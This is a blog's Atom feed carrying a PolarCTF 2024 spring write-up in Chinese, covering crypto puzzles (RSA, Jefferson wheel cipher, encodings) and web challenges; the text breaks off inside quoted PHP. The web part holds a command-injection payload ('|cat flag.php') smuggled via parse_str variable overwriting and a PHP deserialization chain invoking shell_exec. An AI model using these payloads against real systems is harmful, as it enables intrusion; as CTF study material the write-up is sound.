<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HvAng&#39;s Nests</title>
  
  <subtitle>Nice to meet you!</subtitle>
  <link href="https://hvang10.github.io/atom.xml" rel="self"/>
  
  <link href="https://hvang10.github.io/"/>
  <updated>2024-03-31T17:58:28.170Z</updated>
  <id>https://hvang10.github.io/</id>
  
  <author>
    <name>HvAng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PolarCTF2024春季个人挑战赛wp</title>
    <link href="https://hvang10.github.io/2024/03/23/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/"/>
    <id>https://hvang10.github.io/2024/03/23/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/</id>
    <published>2024-03-23T08:34:22.000Z</published>
    <updated>2024-03-31T17:58:28.170Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="【CRYPTO】周杰伦的贝斯"><a href="#【CRYPTO】周杰伦的贝斯" class="headerlink" title="【CRYPTO】周杰伦的贝斯"></a>【CRYPTO】周杰伦的贝斯</h1><p>题目<code>👊👢👧👉👎🐽👅👁👈🐧👉👆👈👣👟👐👊👱🐧🐰👇👈🐴🐴</code><br>其实就对应附件的名字<code>100_64_32</code><br>base100(或者说是Emoji表情符号)-&gt;base64-&gt;base32<br>得到<code>Jay Chou</code><br>flag:<br><code>flag&#123;Jay Chou&#125;</code></p><h1 id="【CRYPTO】rsaaa"><a href="#【CRYPTO】rsaaa" class="headerlink" title="【CRYPTO】rsaaa"></a>【CRYPTO】rsaaa</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">c = <span class="number">75036747635306642448951304206998877676661823155273906467327033126738852180428655042280881978878498990667216678397370196258985509664476355705024803037163192947063192452198182809379575421727717664980771937882048579654137560876937198021458204902826397562775388222716165902130775042367930795903054668968295345506</span></span><br><span class="line">n = p*q</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"><span class="comment"># b&#x27;    welcome to polar&#x27;</span></span><br></pre></td></tr></table></figure><p>flag:<br><code>flag&#123;welcome to polar&#125;</code></p><h1 id="【CRYPTO】阴阳怪气的杰斐逊"><a href="#【CRYPTO】阴阳怪气的杰斐逊" class="headerlink" title="【CRYPTO】阴阳怪气的杰斐逊"></a>【CRYPTO】阴阳怪气的杰斐逊</h1><p>转轮密码解密<br>Word文档里面什么都没有，但是里面肯定藏东西了，binwalk一下，在document.xml里面发现了阴阳怪气编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？</span><br></pre></td></tr></table></figure><p>同时发现密钥： <code>2,5,1,3,6,4,9,7,8,14,10,13,11,12</code><br>阴阳怪气解码得<code>88421048040142242012210140881088421010882010884208842101</code><br>8421，云影密码得到，密文：<code>WLDOFEQWARAVWA</code><br>网上抄过来的n手脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">table = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">12</span>]</span><br><span class="line">Ciphertext = <span class="string">&#x27;WLDOFEQWARAVWA&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;zhuanlun.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"><span class="comment"># 转轮机根据table重新排列</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wheel_decode</span>(<span class="params">data, table</span>):</span><br><span class="line">    resultList = []</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;[A-Z]&#123;26&#125;&#x27;</span>)</span><br><span class="line">    result = pattern.findall(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        resultList.append(result[i-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> resultList</span><br><span class="line">resultList = wheel_decode(data, table)</span><br><span class="line"><span class="comment"># 根据密文重新排列</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rearrange</span>(<span class="params"><span class="type">List</span>, Ciphertext</span>):</span><br><span class="line">    resultList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">14</span>):</span><br><span class="line">        resultList.append(<span class="type">List</span>[i][<span class="type">List</span>[i].find(</span><br><span class="line">            Ciphertext[i]):]+<span class="type">List</span>[i][:<span class="type">List</span>[i].find(Ciphertext[i])])</span><br><span class="line">    <span class="keyword">return</span> resultList</span><br><span class="line">resultList = rearrange(resultList, Ciphertext)</span><br><span class="line"><span class="comment"># 选取每一列，列出结果</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rearrange2</span>(<span class="params"><span class="type">List</span></span>):</span><br><span class="line">    resultList = []</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            s += j[i]</span><br><span class="line"></span><br><span class="line">        resultList.append(s)</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resultList</span><br><span class="line">resultList = rearrange2(resultList)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> resultList:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>发现可疑字符串，<code>FIAGISPQEOUPCS</code><br>问了一下客服，得md5加密套上flag。。。(题目描述也没有说，但polar真的很喜欢flag(md5(xxx)))<br><code>flag&#123;fea3bc74edc5ab76ad9f09ea4f5ac233&#125;</code></p><h1 id="【CRYPTO】歌词最后一句"><a href="#【CRYPTO】歌词最后一句" class="headerlink" title="【CRYPTO】歌词最后一句"></a>【CRYPTO】歌词最后一句</h1><p>附件的第一张图片是专辑《十一月的萧邦》的方面<br>跳舞的小人我解出来是<code>WYDOSNOWSB</code>，感觉没什么用啊<br>一首歌一首歌的试，试出的是第六首《枫》<code>我要的只是你在我身边</code><br>哈哈哈原谅我，挺喜欢周董的歌的，但听的是真不多<br>md5加密一下<br>flag: <code>flag&#123;776e26e39d01c914e8faa6796bf7e9b3&#125;</code><br>补充：看到某个不认识的佬的wp，发现我的小人解错了，O应该是Z，它这个小人背景有白有灰，给看漏眼了(逃)</p><h1 id="【CRYPTO】离家出走的猫猫"><a href="#【CRYPTO】离家出走的猫猫" class="headerlink" title="【CRYPTO】离家出走的猫猫"></a>【CRYPTO】离家出走的猫猫</h1><p>喵语</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~呜喵呜呜~呜喵啊喵啊啊呜喵呜呜啊呜啊~呜呜~喵呜~~喵呜~啊呜啊呜喵呜呜喵~喵~~喵啊喵呜喵呜啊呜啊~呜啊~啊喵~~啊~~喵~啊啊~呜啊啊喵喵啊啊~啊啊啊~呜啊呜呜~呜啊啊~啊喵~呜喵~啊~喵啊呜呜喵~~喵啊~啊~呜~~喵~~~~呜~喵啊呜啊~~~~呜~啊喵呜呜啊啊喵呜喵~呜啊喵呜喵啊呜喵~~啊~~~喵啊啊呜呜呜喵喵~~呜呜呜呜啊喵啊啊啊~喵呜~呜啊喵~~呜~喵喵呜~喵啊~~喵~啊啊~呜喵~~啊~呜~啊呜呜喵啊喵~呜~喵呜~啊啊啊~喵喵啊~~啊~~呜喵~~呜呜~呜啊呜啊呜呜~喵啊喵喵呜呜啊啊~啊~~~呜~啊喵呜呜喵~~喵啊喵~啊~啊~~呜呜呜~喵呜~喵啊呜~喵呜喵喵喵啊喵喵呜喵~~呜喵~呜~喵~喵啊喵啊啊喵喵喵喵喵啊~呜啊~~喵~啊啊~呜呜呜啊呜喵喵啊啊~~啊啊~呜喵~呜~喵啊呜啊~喵啊喵~~~~啊呜喵~~喵啊喵呜啊~~啊~啊呜啊~啊~~啊~啊啊~~~呜~啊喵呜呜啊啊呜啊啊呜喵啊啊喵喵喵呜呜啊~呜啊喵喵~喵啊呜呜呜喵喵~~呜啊喵呜呜呜喵啊啊啊呜喵~呜~呜喵~~~呜~~啊呜啊~~喵~啊啊~呜啊呜喵~喵啊啊~呜喵~~喵啊~~呜呜呜呜喵啊喵呜呜呜~啊~呜~呜啊呜~喵~喵啊啊呜啊喵啊啊喵呜喵呜~~喵~~~~~~呜~啊喵呜啊</span><br></pre></td></tr></table></figure><p>找个网站<a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a><br>得到<code>小小年内则伏勤，月明先自下高台。未似是非唇舌危，五弦一一为君调。一百二十个蜣螂，唯祝台星与福星。梁殿得非萧帝瑞，控鹤岭高星半隔。</code><br>到这就不会了，等wp喽<br>好家伙，官方视频说的是藏头诗递增，真脑洞，不过为什么不去misc<br>重新排版</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小小年内则伏勤，</span><br><span class="line">月明先自下高台。</span><br><span class="line">未似是非唇舌危，</span><br><span class="line">五弦一一为君调。</span><br><span class="line">一百二十个蜣螂，</span><br><span class="line">唯祝台星与福星。</span><br><span class="line">梁殿得非萧帝瑞，</span><br><span class="line">控鹤岭高星半隔。</span><br></pre></td></tr></table></figure><p>明文：<code>小明是一个福瑞控</code><br>知乎上关于福瑞控的介绍是，福瑞的原英文单词Furry，这个词汇的大概意义是多毛的，覆盖毛皮的，所以福瑞控说的是喜欢动物的人(对应题目猫猫)，但在互联网下，成了梗，喜欢拟人化动物的人。学到了，哈哈哈<br>MD5一下，套flag<br><code>flag&#123;66f5c8a2577ffbcb6086e29df7b1bd70&#125;</code></p><h1 id="【CRYPTO】KOBE的祝福短信"><a href="#【CRYPTO】KOBE的祝福短信" class="headerlink" title="【CRYPTO】KOBE的祝福短信"></a>【CRYPTO】KOBE的祝福短信</h1><p>给了我们一张图片需要找对照表，和一个有密码的压缩包<br>我以为跟牢大关系不会很大吧，毕竟CTF这边我好像没见过什么密码跟牢大扯的上关系的。<br>好，一看，官方视频，KOBE CODE，在知乎那边有一个对照表，年份居然是20年2.20，属于自制密码吧，这也能被官方看到拿来出题了<br><a href="https://www.zhihu.com/question/53100727">https://www.zhihu.com/question/53100727</a><br>解出来是<code>NUMBERONE</code>，得到九键密码<code>936382_232162_3163_4381 </code>，手机切换九键，第9格第3个y，依次类推，得到<code>you_can_do_it</code><br>好好好，收到牢大的祝福了，泪目<code>flag&#123;you_can_do_it&#125;</code></p><h1 id="【WEB】覆盖"><a href="#【WEB】覆盖" class="headerlink" title="【WEB】覆盖"></a>【WEB】覆盖</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] == <span class="string">&#x27;www.polarctf.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> .= <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 2 &#x27;</span> . <span class="variable">$a</span>[<span class="number">0</span>] . <span class="variable">$ip</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;其实很简单！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>parse_str变量覆盖，这题跟去年冬季的Web-干正则基本一样<br><code>?id=a[0]=www.polarctf.com&amp;cmd=127.0.0.1|cat flag.php</code><br>先<code>ls</code>一下，发现<code>flag.php</code><br>然后F12查看页面源代码即可</p><h1 id="【WEB】PHP反序列化初试"><a href="#【WEB】PHP反序列化初试" class="headerlink" title="【WEB】PHP反序列化初试"></a>【WEB】PHP反序列化初试</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$env</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;env = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$this</span>-&gt;evil);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;env;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>shell_exec函数相当于我们熟悉的system函数<br>发现<code>f1@g.php index.php </code><br>直接<code>cat f1@g.php</code><br>F12查看页面源代码即可</p><h1 id="【WEB】机器人"><a href="#【WEB】机器人" class="headerlink" title="【WEB】机器人"></a>【WEB】机器人</h1><p>&#x2F;robots.txt得到前半截flag<code>flag&#123;4749ea1ea481a5d</code><br><code>Disallow: /27f5e15b6af3223f1176293cd015771d</code><br>这个不可访问，说明这个路径下还藏了什么东西，看看flag.php给不给访问，访问<code>/27f5e15b6af3223f1176293cd015771d/flag.php</code><br>后半截：<code>56685442c8516b61c&#125;</code><br>flag: <code>flag&#123;4749ea1ea481a5d56685442c8516b61c&#125;</code></p><h1 id="【WEB】PHP-Deserialization"><a href="#【WEB】PHP-Deserialization" class="headerlink" title="【WEB】PHP_Deserialization"></a>【WEB】PHP_Deserialization</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Polar</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$night</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$night_arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;night-&gt;<span class="title function_ invoke__">hacker</span>(<span class="variable">$this</span>-&gt;night_arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Night</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong call:&quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;  arg:&quot;</span> . <span class="variable">$arguments</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Day</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;polar&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;polar&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span 